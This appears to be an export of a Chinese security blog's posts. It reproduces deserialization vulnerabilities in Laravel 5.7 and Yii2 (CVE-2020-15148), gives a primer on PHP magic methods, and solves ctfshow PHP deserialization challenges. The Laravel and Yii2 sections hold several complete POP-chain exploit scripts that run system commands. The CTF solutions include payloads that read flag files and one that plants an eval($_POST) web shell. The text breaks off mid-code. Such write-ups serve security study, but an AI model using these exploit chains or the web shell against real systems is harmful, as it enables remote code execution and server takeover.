$this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>继续报错：</p><pre><code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code></pre><p>此时就到了这条链上最困难的点：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/101803.png" class=""><p><code>Kernel::class</code>是完全限定名称，返回的是一个类的完整的带上命名空间的类名，在laravel这里是<code>Illuminate\Contracts\Console\Kernel</code>。</p><p>打断点跟进：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102333.png" class=""><p>跟进到父类的make()：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102557.png" class=""><p>跟进到resolve()：</p><pre><code>protected function resolve($abstract, $parameters = [])    &#123;        $abstract = $this-&gt;getAlias($abstract);        $needsContextualBuild = ! empty($parameters) || ! is_null(            $this-&gt;getContextualConcrete($abstract)        );        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;            return $this-&gt;instances[$abstract];        &#125;        $this-&gt;with[] = $parameters;        $concrete = $this-&gt;getConcrete($abstract);        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object = $this-&gt;build($concrete);        &#125; else &#123;            $object = $this-&gt;make($concrete);        &#125;        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;            $object = $extender($object, $this);        &#125;        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;            $this-&gt;instances[$abstract] = $object;        &#125;        $this-&gt;fireResolvingCallbacks($abstract, $object);        $this-&gt;resolved[$abstract] = true;        array_pop($this-&gt;with);        return $object;    &#125;</code></pre><p>可以看到最终会返回一个object，我们是要调用这个object的call方法来执行命令，全局查找一下，这个执行命令的call方法到底在哪个类：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/103803.png" class=""><p>发现在container类里，而构造的app的类是Application类，这个类正好也是container类的子类，所以最终返回这个Application的实例就可以了。</p><p>再来看一下resolve()方法的代码：</p><p>$concrete &#x3D; $this-&gt;getConcrete($abstract);</p><pre><code>    protected function getConcrete($abstract)    &#123;        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        // assume each type is a concrete name and will attempt to resolve it as is        // since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;</code></pre><p>第一个if成立不了，主要看第二个if，因为bindings是container的属性，而这里的$this其实就是我们传的app，app的类正好是container的子类，所以bindings的属性同样可控，因此getConcrete()函数的返回值是我们可控的。</p><p><code>getConcrete()</code>函数之后是这个：</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;protected function isBuildable($concrete, $abstract)&#123;    return $concrete === $abstract || $concrete instanceof Closure;&#125;</code></pre><p>这里的$concrete是我们可控的，而$abstract是Illuminate\Contracts\Console\Kernel。经过打断点测试，$this-&gt;build($concrete)得到的结果基本就是最终这个get the value of offset返回的了，因此要想办法让$concrete是Illuminate\Foundation\Application，先来看一下大佬们的poc:</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>这样到了</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;</code></pre><p>的时候，$concrete是Illuminate\Foundation\Application，$abstract是Illuminate\Contracts\Console\Kernel，无法isBuildable，还会再进入一次make，不过这次make中的$concrete就是我们构造的了。进入make，然后再进入resolve，再进入getConcrete()方法:</p><pre><code>    if (isset($this-&gt;bindings[$abstract])) &#123;       return $this-&gt;bindings[$abstract][&#39;concrete&#39;];    &#125;    return $abstract;</code></pre><p>不存在$this-&gt;bindings[‘Illuminate\Foundation\Application’]，所以会直接return Illuminate\Foundation\Application，这样$abstract也是Illuminate\Foundation\Application了,最终<code>$this-&gt;app[Kernel::class]</code>返回的就是实例化的<code>Illuminate\Foundation\Application</code>类了。然后开始调用call方法,最终成功执行命令：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/111438.png" class=""><p>参考链接:<a href="https://blog.csdn.net/rfrder/article/details/113826483">https://blog.csdn.net/rfrder/article/details/113826483</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yii2框架反序列化漏洞复现</title>
      <link href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Yii Framework是一个基于组件、用于开发大型Web应用的高性能 PHP 框架。Yii提供了今日Web 2.0应用开发所需要的几乎一切功能。Yii是最有效率的PHP框架之一。</p><p>Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令，CVE编号是CVE-2020-15148</p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载地址：</p><pre><code>https://github.com/yiisoft/yii2/releases/tag/2.0.37//下载yii-basic-app-2.0.37.tgz</code></pre><p> 修改&#x2F;config&#x2F;web.php文件17行cookieValidationKey,值可以为任何</p><p>进入目录，执行php yii serve</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164228.png" class=""><p>此时就可以进入<a href="http://localhost:8080/">http://localhost:8080/</a></p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164825.png" class=""><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>漏洞的出发点是在<code>\yii\vendor\yiisoft\yii2\db\BatchQueryResult.php</code>文件中</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/192033.png" class=""><p>但是继续跟进close()，发现没什么利用的方法，但是这里的__dataReader是可控的，那么调用了close的方法，可以通过触发__call方法来进行利用。</p><p>全局搜索一下__call方法，在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>存在合适__call的方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193357.png" class=""><p>因为close是无参方法，所以__call中的<code>$method</code>是close,<code>attributes</code>为空。继续跟进format方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193848.png" class=""><p>(<code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数)</p><p>跟进getFormatter:</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/194251.png" class=""><p>因为$this-&gt;formatters是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array($this-&gt;getFormatter($formatter), $arguments);中，回调函数是我们可控的，但是$arguments为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘（直接搜索含有call_user_function的无参函数）：<br>构造正则：</p><pre><code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code></pre><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/201701.png" class=""><p>其中有两个类中的<code>run</code>方法可用：</p><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p>至此梳理一下pop链：</p><pre><code>class BatchQueryResult  -&gt;__destruct()↓↓↓class BatchQueryResult  -&gt;reset()↓↓↓class Generator  -&gt;__call()↓↓↓class Generator  -&gt;format()↓↓↓class Generator  -&gt;getFormatter()↓↓↓class IndexAction  -&gt;run()</code></pre><p>这里可以看一下其他师傅的一张图：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/202329.png" class=""><p>第一步：new了一个yii\db\BatchQueryResult()类，那么就会调用这个类的__construct()方法</p><p>第二步：这个类的__construct()方法会new一个Faker\Generator()类，就又会调用Faker\Generator()类的__construct()方法，并把这个对象赋值给$_dataReader变量。</p><p>第三步：Faker\Generator()类的__construct()方法会new一个yii\rest\CreateAction()类，然后又调用yii\rest\CreateAction()类的__coustrcut()方法。并调用了run方法（这里用了 call_user_func_array后面会讲到），然后赋值给$this-&gt;formatters[‘close’]。</p><p>第四步：反序列化时，类中变量的值我们是可控的；那么就可以通过yii\rest\CreateAction()类的__construct()方法中修改这些变量，将这些值改成命令，成功RCE。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>这是一个反序列化利用链，所以还需要一个反序列化的入口点</p><p>在controllers目录下创建一个TestController.php:</p><pre><code>&lt;?phpnamespace app\controllers; class TestController extends \yii\web\Controller&#123;    public function actionTest($data)&#123;        return unserialize(base64_decode($data));    &#125;&#125;?&gt;</code></pre><p>大佬们的poc：</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker &#123;    use yii\rest\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#39;close&#39;] = [new IndexAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader=new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><p>其他链子：</p><p>yiii 2.0.38</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><p>poc3</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为render            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><p>yii 2.0.42</p><p>poc4</p><pre><code>&lt;?phpnamespace Faker;class DefaultGenerator&#123;    protected $default ;    function __construct($argv)    &#123;        $this-&gt;default = $argv;    &#125;&#125;class ValidGenerator&#123;    protected $generator;    protected $validator;    protected $maxRetries;    function __construct($command,$argv)    &#123;        $this-&gt;generator = new DefaultGenerator($argv);        $this-&gt;validator = $command;        $this-&gt;maxRetries = 99999999;    &#125;&#125;namespace Codeception\Extension;use Faker\ValidGenerator;class RunProcess&#123;    private $processes = [];    function __construct($command,$argv)    &#123;        $this-&gt;processes[] = new ValidGenerator($command,$argv);    &#125;&#125;$exp = new RunProcess(&#39;system&#39;,&#39;whoami&#39;);echo(base64_encode(serialize($exp)));</code></pre><p>poc5</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        function __construct()        &#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace Symfony\Component\String&#123;    use yii\rest\IndexAction;    class LazyString    &#123;        function __construct()        &#123;            $this-&gt;value = [new indexAction(), &quot;run&quot;];        &#125;    &#125;     class UnicodeString    &#123;        function __construct()        &#123;            $this-&gt;value = new LazyString();        &#125;    &#125;&#125;namespace Faker&#123;    use Symfony\Component\String\LazyString;    class DefaultGenerator    &#123;        function __construct()        &#123;            $this-&gt;default = new LazyString();        &#125;    &#125;    class UniqueGenerator    &#123;        function __construct()        &#123;            $this-&gt;generator = new DefaultGenerator();            $this-&gt;maxRetries = 99999999;        &#125;    &#125;&#125;namespace Codeception\Extension&#123;    use Faker\UniqueGenerator;    class RunProcess    &#123;        function __construct()        &#123;            $this-&gt;processes[] = new UniqueGenerator();        &#125;    &#125;&#125;namespace&#123;    use Codeception\Extension\RunProcess;    $exp = new RunProcess();    echo(base64_encode(serialize($exp)));&#125;</code></pre><p>yii 2.2.37</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> yii </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>php在session存储和读取时,都会有一个序列化和反序列化的过程,PHP内置了多种处理器用于存取<code>$_SESSION</code>数据,都会对数据序列化和反序列化,源码中有session_start的时候会读取session,从而进行反序列化.<br>php.ini 中默认 session.serialize_handler 为 php_serialize，而 index.php 中将其设置为 php ，这个差异就导致了 sesssion 反序列化问题。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>php有三种处理器对$_SESSION数据进行序列化和反序列化。</p><p>1、反序列化之后的内容为一个对象；</p><p>2、反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关；</p><p>3、反序列化不触发类的成员方法；需要调用方法后才能触发；</p><p> 常见魔术方法：</p><img src="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/205313.png" class=""><p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化对象时，首先会去自动执行的一个方法</td></tr><tr><td>__destruct()</td><td>在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法（实例化结束后以及反序列化时会触发）</td></tr><tr><td>__sleep()</td><td>序列化serialize()函数回显检查类中是否存在__sleep()，如果存在，该方法会先被调用，然后才执行序列化操作</td></tr><tr><td>__wakeup()</td><td>unserialize()之前会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup()方法</td></tr><tr><td>__tostring()</td><td>表达方式错误导致魔术方法触发（把对象当成字符串调用）</td></tr><tr><td>__invoke()</td><td>格式表达错误导致没魔术方法触发（把对象当成函数调用）</td></tr><tr><td>__call()</td><td>调用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__callStatic()</td><td>静态调用或调用成员常量时使用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__get()</td><td>调用的成员属性是私有属性或不存在时触发（返回值：不存在的成员属性的名称）</td></tr></tbody></table><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__set()</td><td>给不存在的成员属性赋值时触发（返回值：不存在的成员属性的名称和赋的值）</td></tr><tr><td>__isset()</td><td>对不可访问属性(私有的、受保护的或不存在的属性)使用isset()或empty()时，__isset()会被调用 （返回值：不存在的成员属性的名称）</td></tr><tr><td>__unset()</td><td>对不可访问属性使用unset()时触发（返回值：不存在的成员属性名称）</td></tr><tr><td>__clone()</td><td>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</td></tr><tr><td>__serialize()（此特性自 PHP 7.4.0 起可用。）</td><td>serialize()函数会检查类中是否存在一个魔术方法 __serialize() 。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键&#x2F;值 成对的关联数组形式来返回。注：如果类中同时定义了__serialize()和__sleep()两个魔术方法，则只有__seriallize()方法会被调用，__sleep()方法会被忽略</td></tr><tr><td>__unserialize()（此特性自 PHP 7.4.0 起可用。）</td><td>unserialize()检查是否存在具有名为__unserialize() 的魔术方法。注：如果类中同时定义了 __unserialize() 和 __wakeup()两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup()方法会被忽略。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化(ctfshow)</title>
      <link href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"/>
      <url>/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>这关好像和反序列化没什么关系</p><pre><code>payload ?username=xxxxxx&amp;password=xxxxxx</code></pre><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223653.png" class=""><p>这里让我们让反序列后的结果是ctfShowUser的实例化对象。又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());//O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;//由于cookie中将;作为截断符号，所需要编码绕过，这里采用url编码echo urlencode($a);//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>这关需要序列化一个username或password使其反序列化后互不相同就行了</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $username=&#39;haha&#39;;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());echo urlencode($a);?&gt;//运行结果O:11:&quot;ctfShowUser&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;haha&quot;;s:5:&quot;isVip&quot;;b:1;&#125;//url编码处理后：O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22haha%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><code>__construct</code>当对象被创建的时候自动调用，对对象进行初始化。当所有的操作执行完毕之后，需要释放序列化的对象，触发<code>__destruct()</code>魔术方法</p><p>因此我们只需要在执行<code>__construct</code>的时候初始化backDoor类，方便我们进行命令执行的利用，之后反序列化结束后，会执行<code>__destruct()</code>,此时<code>eval($this-&gt;code);</code>等价于<code>eval(system(&#39;cat flag.php&#39;);)</code></p><pre><code>&lt;?phperror_reporting(0);class ctfShowUser&#123;    private $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;    public function getInfo()&#123;        eval($code);    &#125;&#125;echo urlencode(serialize(new ctfShowUser()));?&gt;//要在输出时就要url编码，否则会遗漏掉空格</code></pre><p>最后生成反序列化的数据：</p><pre><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</code></pre><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>这关多了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code></p><p>只需要把O后面的数字前加个加号就可以绕过了（o:+数字:）</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125; &#125; class backDoor&#123;    public $code=&#39;system(&quot;cat f*&quot;);&#39;;&#125;$a = serialize(new ctfShowUser());$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);echo urlencode($a);?&gt;//运行结果O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:17:&quot;system(&quot;cat f*&quot;);&quot;;&#125;&#125;//URL处理O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</code></pre><h3 id="web259"><a href="#web259" class="headerlink" title="web259*"></a>web259*</h3><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p> 这题就简单了，直接序列化一个包含”ctfshow_i_love_36D”的字符串</p><pre><code>&lt;?phpclass ctf&#123;    public $c=&quot;ctfshow_i_love_36D&quot;;&#125;$a=serialize(new ctf());echo urlencode($a);</code></pre><pre><code>payload:ctfshow&#123;3d3ba94d-0c6c-4ae8-8113-b34d15d286b9&#125;</code></pre><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code>注意:如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。//此特性自 PHP 7.4.0 起可用。</code></pre><p><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p><pre><code>&lt;?phpclass ctfshowvip&#123;    public $username;    public $password=&#39;&#39;;    public $code=&#39;&#39;;            public function __construct()&#123;        $this-&gt;username=&#39;877.php&#39;;        $this-&gt;password=&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;                    &#125;    &#125;echo urlencode(serialize(new ctfshowvip()));?&gt;</code></pre><pre><code>payload: vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D</code></pre><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>方法1：非预期</p><p>因为message.php页面中的cookie我们是可控的，所以我们可以直接将序列化加密之后的字符串赋值给cookie即可。</p><pre><code>&lt;?php class message&#123;    public $token=&#39;admin&#39;;&#125;echo urlencode(base64_encode(serialize(new message(1,2,3))));</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223637.png" class=""><p>方法2：<strong>php反序列化字符串逃逸</strong></p><pre><code>字符串逃逸类似于注入，逃逸有一个特征：对序列化后的字符串进行了替换、而且替换后造成了字符数量的不一致，有两种情况，一种是替换后变长，一种是替换后变短。此题将fuck替换成了loveU，所以是变长。</code></pre><p>我们先看看这个：</p><pre><code>&lt;?phpclass message&#123;    public $from=&#39;1&#39;;    public $msg=&#39;2&#39;;    public $to=&#39;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;;&#125;echo urlencode(serialize(new 